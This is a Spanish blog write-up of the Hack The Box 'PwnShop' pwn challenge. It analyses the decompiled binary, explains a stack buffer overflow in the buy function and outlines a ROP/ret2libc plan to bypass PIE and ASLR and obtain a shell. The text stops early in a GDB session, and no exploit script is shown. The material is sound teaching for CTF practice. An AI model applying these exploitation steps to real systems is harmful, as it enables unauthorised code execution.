<!doctype html><html lang="es"><head><title>PwnShop | 7Rocky</title><meta charset="utf-8"><meta http-equiv="x-ua-compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta name="description" content="Binario de 64 bits. Buffer Overflow. Bypass de PIE y ASLR. ROP chain especial. Ret2Libc"><meta itemprop="description" content="Binario de 64 bits. Buffer Overflow. Bypass de PIE y ASLR. ROP chain especial. Ret2Libc"><meta name="twitter:card" content="Binario de 64 bits. Buffer Overflow. Bypass de PIE y ASLR. ROP chain especial. Ret2Libc"><meta name="twitter:description" content="Binario de 64 bits. Buffer Overflow. Bypass de PIE y ASLR. ROP chain especial. Ret2Libc"><meta property="og:description" content="Binario de 64 bits. Buffer Overflow. Bypass de PIE y ASLR. ROP chain especial. Ret2Libc"><meta property="og:type" content="website"><meta name="robots" content="index, follow"><meta name="author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="twitter:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="image" content="https://7rocky.github.io/images/pwn.png"><meta name="twitter:image" content="https://7rocky.github.io/images/pwn.png"><meta property="og:image" content="https://7rocky.github.io/images/pwn.png"><meta property="og:site_name" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta itemprop="name" content="PwnShop"><meta property="twitter:title" content="PwnShop"><meta property="og:title" content="PwnShop"><meta property="og:url" content="https://7rocky.github.io/ctf/htb-challenges/pwn/pwnshop/"><meta itemprop="keywords" content><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script><link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><script src="/js/htb.js"></script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Buscar" rel="noopener" aria-label="Buscar"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg></a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="#" title="es"><img alt="es" height="30px" src="/images/es.png" width="30px"></a>
<a class="link-transition lang link dib z-999 pt3 pt0-l" href="/en/ctf/htb-challenges/pwn/pwnshop/" title="en"><img alt="en" height="30px" src="/images/en.png" style="border:4px solid#000;border-radius:100%" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-100"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- PWN</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/ctf/htb-challenges/pwn/pwnshop/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/ctf/htb-challenges/pwn/pwnshop/&text=PwnShop" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&url=https://7rocky.github.io/ctf/htb-challenges/pwn/pwnshop/&title=PwnShop" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">PwnShop</h1><p class="mb4 f6 dib tracked">14 minutos de lectura</p></header><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#ingeniería-inversa">Ingeniería inversa</a><ul><li><a href="#vulnerabilidad-de-_buffer-overflow_">Vulnerabilidad de <em>Buffer Overflow</em></a></li></ul></li><li><a href="#estrategia-de-explotación">Estrategia de explotación</a></li><li><a href="#desarrollo-del-_exploit_">Desarrollo del <em>exploit</em></a><ul><li><a href="#_bypass_-de-pie"><em>Bypass</em> de PIE</a></li><li><a href="#diseñando-la-rop-_chain_">Diseñando la ROP <em>chain</em></a></li><li><a href="#fugando-direcciones-de-memoria">Fugando direcciones de memoria</a></li><li><a href="#obteniendo-rce">Obteniendo RCE</a></li></ul></li><li><a href="#_flag_"><em>Flag</em></a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><p>Se nos proporciona un binario de 64 bits llamado <code>pwnshop</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">Arch:     amd64-64-little  
RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
Stack:    <span class="code-dark-red">No canary found</span>
NX:       <span class="code-dark-green">NX enabled</span>
PIE:      <span class="code-dark-green">PIE enabled</span>
</code></pre></div><h2 id="ingeniería-inversa">Ingeniería inversa</h2><p>Podemos usar Ghidra para analizar el binario y mirar el código fuente descompilado en C:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">undefined[</span><span class="mtk6">16</span><span class="mtk1">] </span><span class="mtk8">main</span><span class="mtk1">() {</span>
<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> option_char;</span>
<span class="mtk1">  ulong in_RCX;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> option;</span>
<span class="mtk1">  </span>
<span class="mtk1">  </span><span class="mtk8">setup</span><span class="mtk1">();</span>
<span class="mtk1">  </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"========= HTB PwnShop ==========="</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk5">while</span><span class="mtk1"> (</span><span class="mtk6">true</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk5">while</span><span class="mtk1"> (</span><span class="mtk6">true</span><span class="mtk1">) {</span>
<span class="mtk1">      </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"What do you wanna do?"</span><span class="mtk1">);</span>
<span class="mtk1">      </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"1&gt; Buy</span><span class="mtk6">\n</span><span class="mtk4">2&gt; Sell</span><span class="mtk6">\n</span><span class="mtk4">3&gt; Exit</span><span class="mtk6">\n</span><span class="mtk4">&gt; "</span><span class="mtk1">);</span>  
<span class="mtk1">      option_char </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">getchar</span><span class="mtk1">();</span>
<span class="mtk1">      </span><span class="mtk8">getchar</span><span class="mtk1">();</span>
<span class="mtk1">      option </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk7 mtki">char</span><span class="mtk1">) option_char;</span>
<span class="mtk1">      </span><span class="mtk5">if</span><span class="mtk1"> (option </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk4">'2'</span><span class="mtk1">) </span><span class="mtk5">break</span><span class="mtk1">;</span>
<span class="mtk1">      </span><span class="mtk8">sell</span><span class="mtk1">();</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (option </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">'3'</span><span class="mtk1">) </span><span class="mtk5">break</span><span class="mtk1">;</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (option </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">'1'</span><span class="mtk1">) {</span>
<span class="mtk1">      </span><span class="mtk8">buy</span><span class="mtk1">();</span>
<span class="mtk1">    } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">      </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Please try again."</span><span class="mtk1">);</span>
<span class="mtk1">    }</span>
<span class="mtk1">  }</span>

<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8">ZEXT816</span><span class="mtk1">(in_RCX) </span><span class="mtk5">&lt;&lt;</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">40</span><span class="mtk1">;</span>
<span class="mtk1">}</span>
</code></pre></div><p>La primera opción es <code>buy</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">buy</span><span class="mtk1">() {</span>
<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> details[</span><span class="mtk6">72</span><span class="mtk1">];</span>

<span class="mtk1">  </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Sorry, we aren</span><span class="mtk6">\'</span><span class="mtk4">t selling right now."</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"But you can place a request. </span><span class="mtk6">\n</span><span class="mtk4">Enter details: "</span><span class="mtk1">);</span>  
<span class="mtk1">  </span><span class="mtk8">read</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">, details, </span><span class="mtk6">80</span><span class="mtk1">);</span>
<span class="mtk1">}</span>
</code></pre></div><p>Y esta es la segunda opción, <code>sell</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">sell</span><span class="mtk1">() {</span>
<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> res;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">long</span><span class="mtk1"> i;</span>
<span class="mtk1">  byte zero;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> item[</span><span class="mtk6">32</span><span class="mtk1">];</span>
<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> price[</span><span class="mtk6">8</span><span class="mtk1">];</span>
<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">details;</span>
<span class="mtk1">  undefined4 </span><span class="mtk5">*</span><span class="mtk1">pointer;</span>

<span class="mtk1">  zero </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">  details </span><span class="mtk5">=</span><span class="mtk1"> details_global;</span>
<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"What do you wish to sell? "</span><span class="mtk1">);</span>
<span class="mtk1">  price </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk7 mtki">char</span><span class="mtk1">[</span><span class="mtk6">8</span><span class="mtk1">]) </span><span class="mtk5">0x</span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">  pointer </span><span class="mtk5">=</span><span class="mtk1"> (undefined4 </span><span class="mtk5">*</span><span class="mtk1">) item;</span>

<span class="mtk1">  </span><span class="mtk5">for</span><span class="mtk1"> (i </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">8</span><span class="mtk1">; i </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">; i</span><span class="mtk5">--</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk5">*</span><span class="mtk1">pointer </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">    pointer </span><span class="mtk5">=</span><span class="mtk1"> pointer </span><span class="mtk5">+</span><span class="mtk1"> (ulong) zero </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk6">2</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">;</span>
<span class="mtk1">  }</span>

<span class="mtk1">  </span><span class="mtk8">read</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">, item, </span><span class="mtk6">31</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"How much do you want for it? "</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">read</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">, price, </span><span class="mtk6">8</span><span class="mtk1">);</span>
<span class="mtk1">  res </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">strcmp</span><span class="mtk1">(price, </span><span class="mtk4">"13.37</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">);</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (res </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Sounds good. Leave details here so I can ask my g</span><span class="mtk4">uy to take a look."</span><span class="mtk1">);</span>  
<span class="mtk1">    pointer </span><span class="mtk5">=</span><span class="mtk1"> (undefined4 </span><span class="mtk5">*</span><span class="mtk1">) details;</span>

<span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> (i </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">16</span><span class="mtk1">; i </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">; i</span><span class="mtk5">--</span><span class="mtk1">) {</span>
<span class="mtk1">      </span><span class="mtk5">*</span><span class="mtk1">pointer </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">      pointer </span><span class="mtk5">=</span><span class="mtk1"> pointer </span><span class="mtk5">+</span><span class="mtk1"> (ulong) zero </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk6">2</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">;</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk8">read</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">, details, </span><span class="mtk6">64</span><span class="mtk1">);</span>
<span class="mtk1">  } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"What? </span><span class="mtk6">%s</span><span class="mtk4">? The best I can do is 13.37$</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">, price);</span>
<span class="mtk1">  }</span>
<span class="mtk1">}</span>
</code></pre></div><p>Aquí tenemos la oportunidad de escribir datos en <code>details_global</code> (una variable global). Para esto, tenemos que introducir <code>"13.37\n"</code> como <code>price</code>. Además, si <code>price</code> no es <code>"13.37\n"</code>, se mostrará como salida.</p><h3 id="vulnerabilidad-de-_buffer-overflow_">Vulnerabilidad de <em>Buffer Overflow</em></h3><p>El binario es vulnerable a <em>Buffer Overflow</em> en <code>buy</code> porque la variable llamada <code>data</code> tiene 72 bytes asignados como <em>buffer</em>, pero el programa lee hasta 80 bytes de <code>stdin</code> y los guarda en <code>data</code>, sobrepasando el tamaño del <em>buffer</em> reservado si la longitud de los datos de entrada es mayor que 72 bytes.</p><p>Debido a que tenemos un binario de 64 bits sin canario, después del <em>buffer</em> reservado de 72 bytes, se encuentra el valor guardado de <code>$rbp</code>, y justo después, la dirección de memoria guardada. Afortunadamente, esta vez no hay valor de <code>$rbp</code>, por lo que estamos sobrescribiendo la dirección de retorno. Podemos verlo en el código ensamblador:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">objdump</span> -M intel -j .text -d <span class="mtku">pwnshop</span>

pwnshop:     file format elf64-x86-64


Disassembly of section .text:

00000000000010a0 &lt;.text&gt;:
    10a0:       55                      push   rbp
    10a1:       31 c0                   xor    eax,eax
    10a3:       48 8d 2d 79 10 00 00    lea    rbp,[rip+0x1079]        # 2123 &lt;setvbuf@plt+0x1093&gt;  

    ...

    132a:       48 83 ec 48             sub    rsp,0x48
    132e:       48 8d 3d 7a 0d 00 00    lea    rdi,[rip+0xd7a]        # 20af &lt;setvbuf@plt+0x101f&gt;
    1335:       e8 f6 fc ff ff          call   1030 &lt;puts@plt&gt;
    133a:       48 8d 3d 92 0d 00 00    lea    rdi,[rip+0xd92]        # 20d3 &lt;setvbuf@plt+0x1043&gt;
    1341:       31 c0                   xor    eax,eax
    1343:       e8 f8 fc ff ff          call   1040 &lt;printf@plt&gt;
    1348:       48 89 e6                mov    rsi,rsp
    134b:       ba 50 00 00 00          mov    edx,0x50
    1350:       31 ff                   xor    edi,edi
    1352:       e8 09 fd ff ff          call   1060 &lt;read@plt&gt;
    1357:       48 83 c4 48             add    rsp,0x48
    135b:       c3                      ret

    ...

    13c5:       66 66 2e 0f 1f 84 00    data16 nop WORD PTR cs:[rax+rax*1+0x0]
    13cc:       00 00 00 00
    13d0:       f3 0f 1e fa             endbr64
    13d4:       c3                      ret
</code></pre></div><p>Aquí hay <code>sub rsp, 0x48</code>, luego el programa lee hasta <code>0x50</code> bytes, y al final revierte el <em>stack</em> con <code>add rsp,0x48</code>. Como no hay instrucción <code>leave; ret</code>, <code>$rbp</code> no se tiene en cuenta, solo la dirección de retorno.</p><h2 id="estrategia-de-explotación">Estrategia de explotación</h2><p>Como el binario tiene protección NX, tenemos que utilizar <em>Return Oriented Programming</em> (ROP) para ejecutar código arbitrario. Esta técnica hace uso de <em>gadgets</em>, que son conjuntos de intrucciones que terminan en <code>ret</code> (normalmente). Podemos añadir una lista de direcciones de <em>gadgets</em> en la pila para que cuando un <em>gadget</em> se ejecute, vuelva a la pila y se ejecute el siguiente <em>gadget</em>. De ahí el nombre de ROP <em>chain</em>.</p><p>Esto es un <em>bypass</em> de la protección NX, ya que no estamos ejecutando instrucciones en la pila (<em>shellcode</em>), sino que estamos redirigiendo el programa a direcciones específicas que son ejecutables y que contienen las instrucciones que queremos.</p><p>Para conseguir ejecución de comandos, usaremos un ataque Ret2Libc. Esta técnica consiste en llamar a <code>system</code> en Glibc usando <code>"/bin/sh"</code> como primer argumento a la función (que también se encuentra en Glibc). El problema que tenemos que solucionar es ASLR, que es una protección habilitada en librerías compartidas para aleatorizar una dirección base.</p><p>Como tenemos que llamar a <code>system</code> y usar <code>"/bin/sh"</code>, tenemos que saber las direcciones de dichos valores en Glibc en tiempo de ejecución (estas direcciones serán diferentes en cada ejecución). Por tanto, tenemos que encontrar una manera de fugar una dirección de Glibc porque lo único que es aleatorio es la dirección base de Glibc; el resto de las direcciones se calculan mediante <em>offsets</em> a dicha dirección base.</p><p>Como el binario tiene PIE habilitado, necesitamos fugar una dirección del binario en tiempo de ejecución y calcular la dirección base usando <em>offsets</em>.</p><p>El proceso de fuga de una función involucra llamar a <code>puts</code> con una dirección de la Tabla de <em>Offsets</em> Globales (<em>Global Offset Table</em>, GOT) como primer argumento (por ejemplo, <code>setvbuf</code>). Esta tabla contiene las direcciones reales de las funciones externas usadas por el programa (si han sido resueltas previamente). Como <code>puts</code> se utiliza en el binario, para llamarla, solamente tenemos que usar la Tabla de Enlaces a Procedimentos (<em>Procedure Linkage Table</em>, PLT), que aplica un salto a la dirección real de <code>puts</code>.</p><p>Otra consideración es el uso de <em>gadgets</em>. Debido a la convención de llamadas a funciones en binarios de 64 bits, los argumentos de las funciones van en los registros (en orden: <code>$rdi</code>, <code>$rsi</code>, <code>$rdx</code>, <code>$rcx</code>&mldr;). Por ejemplo, la instrucción <code>pop rdi</code> tomará el siguiente valor de la pila lo lo guardará en <code>$rdi</code>.</p><h2 id="desarrollo-del-_exploit_">Desarrollo del <em>exploit</em></h2><p>Perfecto, vamos a empezar con el proceso de fuga. En primer lugar tenemos que encontrar una dirección del binario. Lo mejor es usar GDB y mirar a la variable <code>price</code> antes de escribirla:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">gdb</span> -q <span class="mtku">pwnshop</span>
Reading symbols from <span class="code-dark-green">pwnshop</span>...
(No debugging symbols found in <span class="code-dark-green">pwnshop</span>)
<span class="code-red">gef➤  </span>run
Starting program: ./pwnshop
========= HTB PwnShop ===========
What do you wanna do?
1&gt; Buy
2&gt; Sell
3&gt; Exit
&gt; 2
What do you wish to sell? asdf
How much do you want for it? ^C
Program received signal SIGINT, Interrupt.
<span class="code-dark-blue">0x00007ffff7ecafd2</span> in <span class="code-dark-yellow">__GI___libc_read</span> (<span class="code-dark-cyan">fd</span>=0x0, <span class="code-dark-cyan">buf</span>=0x7fffffffe640, <span class="code-dark-cyan">nbytes</span>=0x8) at <span class="code-dark-green">../sysdeps/unix/sysv/linux/read.c</span>:26  
26      ../sysdeps/unix/sysv/linux/read.c: No such file or directory.
